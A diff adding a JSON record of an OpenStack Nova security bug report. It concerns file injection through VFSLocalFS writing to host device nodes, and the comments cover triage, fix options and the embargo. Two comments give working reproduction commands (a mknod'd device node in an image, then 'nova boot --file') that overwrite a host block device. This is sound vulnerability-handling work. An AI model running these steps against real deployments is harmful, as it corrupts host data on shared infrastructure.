@@ -1,0 +1,256 @@
+{
+    "status": "Confirmed", 
+    "last_updated": "2017-10-02 22:06:56.070911+00:00", 
+    "description": "Reported by Garth Mollett from Red Hat.\n\nThe nova.virt.disk.vfs.VFSLocalFS has measures to prevent symlink traversal outside of the root of the images directory but it does not prevent access to device nodes inside the image itself. A simple fix should be to mount with the 'nodev' option.\n\nUnder certain circumstances, the boot process will fold back to VFSLocalFS when trying to inject the public key, for libvirt:\n\n* when libguestfs is not installed or can't be loaded.\n* use_cow_images=false and inject_partition for non-nbd\n* for loopback mount at least, there is a race condition to win in virt/disk/mount/api.py between kpartx and a /dev/mapper/ file creation: os.path.exists can run before the path exists even though it's there half a second later.\n\nThe xenapi is also likely vulnerable, though untested.", 
+    "tags": [], 
+    "importance": "Undecided", 
+    "heat": 270, 
+    "link": "https://bugs.launchpad.net/nova/+bug/1552042", 
+    "owner": "None", 
+    "id": 1552042, 
+    "index": 6072, 
+    "created": "2016-03-02 02:15:04.522162+00:00", 
+    "title": "Host data corruption through nova inject_key feature", 
+    "comments": [
+        {
+            "content": "This issue is being treated as a potential security risk under embargo. Please do not make any public mention of embargoed (private) security vulnerabilities before their coordinated publication by the OpenStack Vulnerability Management Team in the form of an official OpenStack Security Advisory. This includes discussion of the bug or associated fixes in public forums such as mailing lists, code review systems and bug trackers. Please also avoid private disclosure to other individuals not already approved for access to this information, and provide this same reminder to those who are made aware of the issue prior to publication. All discussion should remain confined to this private bug report, and any proposed fixes should be added to the bug as attachments.\n\n--\n\nReported by Garth Mollett from Red Hat.\n\nThe nova.virt.disk.vfs.VFSLocalFS has measures to prevent symlink traversal outside of the root of the images directory but it does not prevent access to device nodes inside the image itself. A simple fix should be to mount with the 'nodev' option.\n\nUnder certain circumstances, the boot process will fold back to VFSLocalFS when trying to inject the public key, for libvirt:\n\n* when libguestfs is not installed or can't be loaded.\n* use_cow_images=false and inject_partition for non-nbd\n* for loopback mount at least, there is a race condition to win in virt/disk/mount/api.py between kpartx and a /dev/mapper/ file creation: os.path.exists can run before the path exists even though it's there half a second later.\n\nThe xenapi is also likely vulnerable, though untested.", 
+            "date_created": "2016-03-02 02:15:04.522162+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Since this report concerns a possible security risk, an incomplete security advisory task has been added while the core security reviewers for the affected project or projects confirm the bug and discuss the scope of any vulnerability along with potential solutions.", 
+            "date_created": "2016-03-02 02:17:47.444645+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "I haven't replicated, but this looks like a real bug to me. As Garth says, though, it only affects systems without libguestfs. Note that if libguestfs is installed but not working this will give an error rather than falling back to being vulnerable. This would mean, for example, that no version of OpenStack shipped by Red Hat is affected, as libguestfs is a dependency of Nova compute in our packaging.\n\nThe impact is that you can use the inject files capability to write to arbitrary block/character devices on the compute host.\n\nI believe mounting with nodev would fix the problem. It also might be a good idea if append_file, replace_file, and read_file checked that their targets were regular files before returning data.\n\nMore generally, I don't think that the design of VFSLocalFS is a good idea. With VFSLocalFS we're essentially implementing our own in-house containerisation. This domain is fraught with security holes even in projects which are entirely devoted to it. We're unlikely to do a good job over time in a backwater bit of Nova on a fallback path. Lets leverage another project. We could even engage the libguestfs project to support other backends more directly if that was considered important. It's also worth noting that libguestfs is usable today on systems without kvm, and given that our usage is essentially exclusively io, the lack of hardware-accelerated virt shouldn't be a big deal.", 
+            "date_created": "2016-03-02 12:56:08.907392+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "I've confirmed that this is exploitable after talking to Matt, notes below using an up to date devstack env :\n\n- libguestfs not installed on this Fedora 22 host.\n- use_cow_images = False\n- force_config_drive = False\n- inject_partition = 0\n\n- Customise an image to include a special block file pointing to a host device :\n\n$ virt-customize -a cirros-0.3.4-x86_64-disk.img --run-command 'mknod host-device b 252 0'\n[   0.0] Examining the guest ...\n[  14.4] Setting a random seed\n[  14.4] Running: mknod host-device b 252 0\n[  14.5] Finishing off\n\n- Write a marker to the host device before starting an instance :\n\nroot@host $ lsblk\nNAME      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT\nsda         8:0    0   55G  0 disk \n|-sda1      8:1    0  500M  0 part /boot\n|-sda2      8:2    0  615M  0 part [SWAP]\n`-sda3      8:3    0 53.9G  0 part /\nvda       252:0    0    1G  0 disk \nroot@host $ echo 'Before starting an instance' > /dev/vda\nroot@host $ strings /dev/vda \nBefore starting an instance\n\n- Upload the image and start an instance, injecting a file into the special block file previously created :\n\n$ glance image-create --name cirros-fake-dev --file cirros-0.3.4-x86_64-disk.img --disk-format qcow2 --container-format bare \n[..]\n$ cat test-file \nAfter running an instance\n$ nova boot --image cirros-fake-dev --file /host-device=test-file --flavor 1 test-inject\n[..]\n\n- Confirm this is seen in the host :\n\nroot@host $ strings /dev/vda \nAfter running an instance\n", 
+            "date_created": "2016-03-02 13:40:07.535122+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "Many thank Lee for the investigation. I've confirmed the OSSA task and raised its priority accordingly. Obviously write access to raw device nodes has fairly serious security implications.", 
+            "date_created": "2016-03-02 14:02:04.334352+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Incidentally, I don't believe that use_cow_images=False is a requirement for this vulnerability. I believe that any backend is vulnerable regardless of how it was mounted, as long as libguestfs is not in use.", 
+            "date_created": "2016-03-02 14:21:31.293008+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "Right this should also be possible when using nbd once the race identified in the original description and again in bug#1484586 is addressed.  Also, to correct c#3 I was using inject_partition = 1 here not 0.\n\nI've tested and confirmed that using nodev as a mount option works around this issue for now but I'm fully behind the idea of dropping VFSLocalFS and focusing more on VFSGuestFS.", 
+            "date_created": "2016-03-02 17:54:56.106948+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "I have not tested, but from looking at the code it looks like xenapi uses VFSLocalFS as the default.", 
+            "date_created": "2016-03-02 21:30:22.587549+00:00", 
+            "author": "https://api.launchpad.net/1.0/~gmollett"
+        }, 
+        {
+            "content": "In virt/xenapi/vm_utils:\n\n53 from nova.virt.disk import api as disk\n54 from nova.virt.disk.vfs import localfs as vfsimpl\n[..]\n1711 def preconfigure_instance(session, instance, vdi_ref, network_info):\n[..]\n1721     mount_required = key or net or metadata\n1722     if not mount_required:\n1723         return\n1724\n1725     with vdi_attached_here(session, vdi_ref, read_only=False) as dev:\n1726         _mounted_processing(dev, key, net, metadata)\n[..]\n2455 def _mounted_processing(device, key, net, metadata): \n[..]\n2461         err = _mount_filesystem(dev_path, tmpdir)\n2462         if not err:\n2463             try:\n2464                 # This try block ensures that the umount occurs\n2465                 if not agent.find_guest_agent(tmpdir):\n2466                     vfs = vfsimpl.VFSLocalFS(imgfile=None,\n2467                                              imgfmt=None,\n2468                                              imgdir=tmpdir)\n2469                     LOG.info(_LI('Manipulating interface files directly'))\n2470                     # for xenapi, we don't 'inject' admin_password here,\n2471                     # it's handled at instance startup time, nor do we\n2472                     # support injecting arbitrary files here.\n2473                     disk.inject_data_into_fs(vfs,\n2474                                              key, net, metadata, None, None)\n\nI'm not sure how reachable that is and I didn't look at agent.find_guest_agent() or just try and run it (no xen). But it certainly looks to be reachable from that. ", 
+            "date_created": "2016-03-02 21:50:36.933621+00:00", 
+            "author": "https://api.launchpad.net/1.0/~gmollett"
+        }, 
+        {
+            "content": "Forgot this (which is also lacking nodev):\n\n2444 def _mount_filesystem(dev_path, dir): \n2445     \"\"\"mounts the device specified by dev_path in dir.\"\"\"\n2446     try:\n2447         _out, err = utils.execute('mount',\n2448                                  '-t', 'ext2,ext3,ext4,reiserfs',\n2449                                  dev_path, dir, run_as_root=True)", 
+            "date_created": "2016-03-02 21:55:34.385003+00:00", 
+            "author": "https://api.launchpad.net/1.0/~gmollett"
+        }, 
+        {
+            "content": "Is there someone with a xenapi setup working on this ?", 
+            "date_created": "2016-03-21 14:37:33.783698+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "I don't have a xenapi setup but would be willing to patch this if others are able to test.", 
+            "date_created": "2016-03-22 09:27:21.287752+00:00", 
+            "author": "https://api.launchpad.net/1.0/~lyarwood"
+        }, 
+        {
+            "content": "It's also perfectly reasonable to subscribe Xen subject matter experts from outside the nova-coresec team to assist on a Xen-specific integration such as this.", 
+            "date_created": "2016-03-22 15:06:20.182590+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }, 
+        {
+            "content": "@Tony, any progress ? Is there someone from nova team we could subscribe to investigate the xenapi impact ?", 
+            "date_created": "2016-04-04 14:34:09.913423+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "I though that pretty much any time you mount a filesystem directly you are exposed to potential security problems. I wonder if the right option here is to just remove the non libguestfs fallback. It seems completely reasonable to just require that one known safe path.", 
+            "date_created": "2016-04-18 13:05:21.372300+00:00", 
+            "author": "https://api.launchpad.net/1.0/~sdague"
+        }, 
+        {
+            "content": "I strongly agree with Sean, having a privileged process on the hypervisor host mount an untrusted filesystem is asking for trouble. New execution paths through the kernel from filesystem handling bugs are found regularly and are a recipe for disaster.", 
+            "date_created": "2016-04-18 14:42:03.514469+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }, 
+        {
+            "content": "I would also favour removing the fallback in favour of libguestfs, although we should be certain that we're comfortable that either libguestfs is available everywhere we need it to be, or that we're comfortable with injection not working everywhere. libguestfs has a fairly fearsome dependency list.\n\nWe're also mounting filesystems in other places, btw. IIRC our libvirt lxc backend does this. nodev is presumably not an option in that case, but surely lxc has a defence against that. I have no idea what it is, though.", 
+            "date_created": "2016-04-18 15:03:12.006971+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mbooth-9"
+        }, 
+        {
+            "content": "@nova-coresec, any progess on that issue ?", 
+            "date_created": "2016-05-02 19:17:41.653369+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "I just did a quick runthrough of the code for xen and I'm not sure if this is exploitable, but I don't fully understand the original bug.\n\nThe xen code from Garth above is used only for injecting keypair and network data. And it is only run if the 'flat_injected' config option is set to True(default False). This is a nova-network option.\n\nThe provided replication scenario from Lee would not work here because user injected_files are done via the xenbus communication channel and do not rely on mounting anything to the host. The files that are injected via a mounted filesystem are network data and the public_key keypair data, with no user control over which files are written.\n\nI'm going to ping Bob Ball and ask him to take a look.", 
+            "date_created": "2016-05-31 13:20:25.798496+00:00", 
+            "author": "https://api.launchpad.net/1.0/~alaski"
+        }, 
+        {
+            "content": "As in the comments above, I believe XenAPI is also vulnerable and needs to add -o nodev to vm_utils._mount_filesystem.\n\nThe VFS code only gets executed if the Rackspace agent is not installed, but as that is also removable by the guest, that's no protection.\n\nAs XenAPI uses the LocalFileImage model, it doesn't seem to use the mount provided by vfs.\n\nWill attempt a repro + fix for XenAPI", 
+            "date_created": "2016-05-31 14:00:28.217797+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bob-ball"
+        }, 
+        {
+            "content": "After an attempted repro, I'm not convinced that XenAPI is vulnerable:\n\nstack@DevStackOSDomU:~$ grep flat_injected /etc/nova/nova.conf\nflat_injected = True\n\nstack@DevStackOSDomU:~$ lsblk | grep xvdb\nxvdb    202:16   0     1G  0 disk\n\nstack@DevStackOSDomU:~$ nova boot --image cirros-0.3.4-x86_64-disk --flavor 1 NodevFix\nstack@DevStackOSDomU:~$ nova list | grep NodevFix\n| 23db106a-321d-4033-8368-cc6d91d3d307 | NodevFix | ACTIVE | -          | Running     | private=10.0.0.2 |\n\nstack@DevStackOSDomU:~$ ssh cirros@10.0.0.2 sudo mknod /host-device b 202 16\nstack@DevStackOSDomU:~$ ssh cirros@10.0.0.2 sudo sync\n\nstack@DevStackOSDomU:~$ nova image-create 23db106a-321d-4033-8368-cc6d91d3d307 ImageWithDev\n\nstack@DevStackOSDomU:~$ echo \"Before running an instance\" | sudo tee /dev/xvdb\nstack@DevStackOSDomU:~$ echo \"After running an instance\" > test-file\n\nstack@DevStackOSDomU:~$ nova boot --file /host-device=test-file --image 508c35dd-dc18-40d5-82f1-58b0180520a8 --flavor 1 NodevFix_exploit\nstack@DevStackOSDomU:~$ strings /dev/xvdb\nBefore running an instance\n\nstack@DevStackOSDomU:~$ nova list | grep NodevFix_exploit\n| ba73ef12-a60a-4e91-b4a0-3046db5131ba | NodevFix_exploit | ACTIVE | -          | Running     | private=10.0.0.6 |\n\nstack@DevStackOSDomU:~$ ssh cirros@10.0.0.6 sudo cat /host-device\nAfter running an instance\nstack@DevStackOSDomU:~$ ssh cirros@10.0.0.6 sudo ls -altr /host-device\n-r--r-----    1 root     root            26 May 31 15:13 /host-device\n\nAnd just to check what happened without the file injection:\nstack@DevStackOSDomU:~$ nova boot --image 508c35dd-dc18-40d5-82f1-58b0180520a8 --flavor 1 NodevFix_NoInject\nstack@DevStackOSDomU:~$ nova list | grep NodevFix_NoInject\n| fc3f1a45-6048-4abf-82a5-5b9b352c59fe | NodevFix_NoInject | ACTIVE | -          | Running     | private=10.0.0.8 |\nstack@DevStackOSDomU:~$ ssh cirros@10.0.0.8 sudo ls -altr /host-device\nbrw-------    1 root     root      202,  16 May 31 15:06 /host-device\n\nAs such, it *looks* like the way XenAPI uses vfs will replace the mknod device with the requested file?", 
+            "date_created": "2016-05-31 14:29:00.759069+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bob-ball"
+        }, 
+        {
+            "content": "Correction - this is config drive doing the injection; injected_files are only referenced in config_drive and agent code paths.\nBoth of these occur at run time, in the guest context, so can't have access to the compute's devices.\n\nI'm now happy that XenAPI is not vulnerable.", 
+            "date_created": "2016-05-31 14:43:00.091421+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bob-ball"
+        }, 
+        {
+            "content": "This is the last time this was on a public list - http://lists.openstack.org/pipermail/openstack-dev/2014-September/046967.html\n\nI really think we should prevent that entire path triggering if we are on libvirt kvm/qemu, and not allow for the fallback.\n\nPoking around to figure out if this is even an option with current gate config here - https://review.openstack.org/#/c/324720/", 
+            "date_created": "2016-06-02 17:25:16.805121+00:00", 
+            "author": "https://api.launchpad.net/1.0/~sdague"
+        }, 
+        {
+            "content": "There are other reasons that there are potential security issues. The filesystem is a glance image, so it is created by the user. Which means that it needs to be considered harmful all on it's own - https://lwn.net/Articles/369072/ ", 
+            "date_created": "2016-06-03 14:40:07.236390+00:00", 
+            "author": "https://api.launchpad.net/1.0/~sdague"
+        }, 
+        {
+            "content": "According to above comments, it seems like we can safely remove the embargo and make this bug public. I propose we do this by the end of the week if nobody objects.\n\nAnd if we can drop the non libguestfs code path on stable branches, we can still issue an OSSA.", 
+            "date_created": "2016-06-07 09:17:29.141627+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "+1 for removing the fall back to local mount vs adding nodev. Even without this bug, mounting an untrusted local filesystem exposes a ton of sensitive kernel/ring0 attack-surface on the compute host.\n\nHard error from a missing/broken dependency is much better security design choice than falling back to unsafe behavior IMO.", 
+            "date_created": "2016-06-08 03:27:01.789006+00:00", 
+            "author": "https://api.launchpad.net/1.0/~gmollett"
+        }, 
+        {
+            "content": "I am also not convinced Xen is not vulnerable.\nThe disk.inject_data_into_fs call in vm_utils.py looks to be reachable with the fs mounted on the host as a fall-back if agent.find_guest_agent doesn't return True, which should happen straight away if CONF.xenserver.disable_agent is set:\n\n381 def find_guest_agent(base_dir):\n385     if CONF.xenserver.disable_agent:\n386         return False\n\nCan we retry the reproduction with this set? \n\n\n", 
+            "date_created": "2016-06-08 06:13:05.970027+00:00", 
+            "author": "https://api.launchpad.net/1.0/~gmollett"
+        }, 
+        {
+            "content": "I tested without an agent, but even with an agent arbitrary file injection is not possible with that route, only with an agent or with config drive.", 
+            "date_created": "2016-06-08 06:27:50.858432+00:00", 
+            "author": "https://api.launchpad.net/1.0/~bob-ball"
+        }, 
+        {
+            "content": "I've subscribed ossg-coresec for some input on moving this to public before the fixes are available as per: https://security.openstack.org/vmt-process.html#embargo-exceptions\n\nIn general, it looks like this would be good to bring to the public so that we can be sure all the possible dangerous code paths are considered. Based on the 2014 thread (from sean in comment #23) and the discussion here, it looks like the the general view is removing the fall-back code.\n\nLets make this public by the end of this week unless there are objections from the team working on the fixes or the ossg-coresec group.", 
+            "date_created": "2016-06-13 15:24:48.344901+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mdrnstm"
+        }, 
+        {
+            "content": "It seems like there is some impact that can be prevented by using 'nodev' in the short term.  Can we patch this issue and then open up further?  Just thinking aloud...  \n\nWhat's the critical path - the worst case scenario and impact currently?", 
+            "date_created": "2016-06-13 21:28:41.164017+00:00", 
+            "author": "https://api.launchpad.net/1.0/~travis-mcpeak"
+        }, 
+        {
+            "content": "Just spoke with sdague and we'll push forward with the patch in https://review.openstack.org/#/c/324720/ -- I'll followup to address the pep8 issues and we can get that merged/work with stable groups to accept it for backport.\n\nThis indicates to me (and based on the ML topic linked above) we can open this up to the public. Just waiting for OSSG ack before doing so.", 
+            "date_created": "2016-06-27 15:28:24.427373+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mdrnstm"
+        }, 
+        {
+            "content": "From http://lists.openstack.org/pipermail/openstack-dev/2014-September/046764.html it sounds like the fallback to localfs is even possible with ubuntu 14.04, which is what we CI test with in OpenStack before Newton (and still in Newton for some jobs, but I think that's changing during the release so jobs are using ubuntu 16.04).\n\nThat thread also talks about enforcing no fallback to localfs only for certain virt_types (kvm/qemu), but not for example lxc - so what's proposed regarding removal? Total removal as https://review.openstack.org/#/c/324720/ proposes? Or only partial depending on configuration?", 
+            "date_created": "2016-06-27 15:47:04.947324+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mriedem"
+        }, 
+        {
+            "content": "The thread also mentioned some linux distros like FreeBSD that don't support libguestfs - I don't know if there have been improvements since then that libguestfs is now supported on newer versions of FreeBSD or not.", 
+            "date_created": "2016-06-27 15:47:47.077439+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mriedem"
+        }, 
+        {
+            "content": "Bug 1413142 has some history on libguestfs in ubuntu 14.04 CI testing.", 
+            "date_created": "2016-06-27 15:51:44.252752+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mriedem"
+        }, 
+        {
+            "content": "I guess I'd be OK with saying we don't support file injection on any cloud that doesn't have libguestfs on it's computes (using FreeBSD for example, or older ubuntu). But does this also mean resize/migration won't work with how VFS is used here?\n\nhttps://github.com/openstack/nova/blob/5f70f1977ddcd5965d4908a20ae9380756885a08/nova/virt/disk/api.py#L225", 
+            "date_created": "2016-06-27 16:13:04.773110+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mriedem"
+        }, 
+        {
+            "content": "Also, a (perhaps pedantic) correction, FreeBSD is a Unix derivative and not at all a \"linux distro.\"", 
+            "date_created": "2016-06-27 17:33:05.193052+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }, 
+        {
+            "content": "/me hangs head in shame", 
+            "date_created": "2016-06-27 17:57:28.302619+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mriedem"
+        }, 
+        {
+            "content": "I think making this public is fine.  The review is out there so ....", 
+            "date_created": "2016-06-29 06:45:11.999075+00:00", 
+            "author": "https://api.launchpad.net/1.0/~o-tony"
+        }, 
+        {
+            "content": "I do worry about pulling out a \"feature\" like that with deprecation but Matt and Sean seem okay with it so I'm probably missing something.", 
+            "date_created": "2016-06-29 06:45:55.955309+00:00", 
+            "author": "https://api.launchpad.net/1.0/~o-tony"
+        }, 
+        {
+            "content": "I'm not opposed to making this public for a variety of reasons (including limited scope of affected configurations, complexity and noisiness of exploiting, and relatively low impact), but hesitate to see the public existence of https://review.openstack.org/324720 as a reason since it doesn't actually call itself out as mitigating a vulnerability nor does it mention this bug report.", 
+            "date_created": "2016-06-29 14:10:56.874732+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }, 
+        {
+            "content": "@Travis, it seems like the nodev patch isn't good enough since the non-libguestfs foldback is still vulnerable to ring 0 attack when malicious filesystem are mounted on compute host. Moreover the limited scope of this issue probably doesn't warrant an embargoed disclosure.\n\nThus I'd like to make this bug public because the removal of non-libguestfs use-case could use public review. Comments or objections are most welcome.", 
+            "date_created": "2016-07-14 20:55:30.335274+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "Tristan - sounds good, thanks for recap.", 
+            "date_created": "2016-07-14 22:43:52.802631+00:00", 
+            "author": "https://api.launchpad.net/1.0/~travis-mcpeak"
+        }, 
+        {
+            "content": "I've removed the critical importance on the OSSA task for now as it seems the scope of this vulnerability isn't as broad as was initially thought. I'm happy to revisit it, but given it's been 6 months at this point it at least doesn't seem critical to anyone.", 
+            "date_created": "2016-09-20 21:58:08.508853+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }, 
+        {
+            "content": "It seems like both ossg-coresec and nova-coresec are ok with opening this bug report. If nobody objects, lets make this bug public by the end of the week.", 
+            "date_created": "2016-09-26 13:51:34.924614+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "As there were no further objections after a lengthy review period under embargo, I'm switching this bug to Public Security.\n\nIt's still unclear to me on the backport suitability of the proposed fix for stable branches, so I've set the security advisory status back to incomplete while that's confirmed.", 
+            "date_created": "2016-11-17 20:06:07.556592+00:00", 
+            "author": "https://api.launchpad.net/1.0/~fungi"
+        }, 
+        {
+            "content": "Matt and Sean, is there a particular reason why https://review.openstack.org/#/c/324720/ is now abandoned?  Then what other options do we have here?", 
+            "date_created": "2017-01-18 06:39:24.890922+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "@nova-coresec: any progress?", 
+            "date_created": "2017-05-24 04:24:54.998162+00:00", 
+            "author": "https://api.launchpad.net/1.0/~tristan-cacqueray"
+        }, 
+        {
+            "content": "https://review.openstack.org/#/c/324720/ was revived. We're also going to deprecate file injection in the compute API in queens but on a new microversion, so we'll still honor injecting files using libguestfs with older microversions.\n\nhttps://review.openstack.org/#/c/509013/", 
+            "date_created": "2017-10-02 22:06:55.436485+00:00", 
+            "author": "https://api.launchpad.net/1.0/~mriedem"
+        }
+    ]
+}
